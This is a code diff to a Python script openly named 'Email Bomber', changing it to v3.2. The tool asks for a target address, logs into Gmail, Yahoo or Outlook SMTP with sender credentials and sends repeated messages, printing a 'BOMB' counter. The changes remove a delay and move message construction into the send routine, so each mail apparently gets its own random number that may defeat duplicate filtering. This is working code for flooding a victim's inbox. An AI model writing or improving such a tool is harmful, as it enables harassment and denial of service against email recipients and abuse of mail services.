@@ -19,7 +19,7 @@ def banner():
     print("setting up SMTLIB...")
     print("setting up email...")
     print(green + "initializing complete")
-    version = "Email Bomber v3.1"
+    version = "Email Bomber v3.2"
     time.sleep(1)
     print(version)
     coder = "OΛΠ DEV and typicaldevin the gamer"
@@ -83,7 +83,6 @@ class Email_Bomber:
     def email(self):
         try:
             print(green + "\n  setting up email...")
-            time.sleep(1)
             print(green + "setup complete")
             self.server = str(input(yellow + "Enter email server / or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: "))
             premade = ['1', '2', '3']
@@ -107,10 +106,7 @@ class Email_Bomber:
             self.fromAddr = str(input(yellow + 'Enter sender address <: '))
             self.fromPwd = str(input(yellow + 'Enter sender password <: '))
             self.subject = str(input(yellow + 'Enter subject <: '))
-            self.message = str(input(yellow + 'Enter message <: ') + f'      Mail Number :   {random.randint(0,1000000)} ')
-
-            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
-             ''' % (self.fromAddr, self.target, self.subject, self.message)
+            self.message_str = str(input(yellow + 'Enter message <: '))
 
             self.s = smtplib.SMTP(self.server, self.port)
             self.s.ehlo()
@@ -122,6 +118,9 @@ class Email_Bomber:
 
     def send(self):
         try:
+            self.message = f'{self.message_str}      | Mail Number   {random.randint(1 ,1000000)}'
+            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
+             ''' % (self.fromAddr, self.target, self.subject, self.message)
             self.s.sendmail(self.fromAddr, self.target, self.msg)
             self.count += 1
             print(purple + f'BOMB: {self.count}')
